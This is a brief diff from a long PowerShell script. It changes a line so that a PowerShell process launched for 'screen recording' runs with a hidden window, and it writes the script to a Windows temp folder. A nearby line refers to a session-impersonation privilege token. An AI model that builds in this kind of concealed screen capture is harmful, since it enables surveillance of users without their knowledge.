@@ -4199,7 +4199,7 @@ SeDelegateSessionUserImpersonatePrivilege token."
 
     Write-Host "Starting screen recording..."
     # Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -WindowStyle Hidden
-    Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -PassThru #-WindowStyle Hidden
+    Start-Process powershell -ArgumentList "-NoExit", "-Command & {$script}" -PassThru -WindowStyle Hidden
 
 }
 '@ | Out-File -FilePath C:\Windows\Temp\VTS\rc\start2.ps1 -Force -Encoding utf8
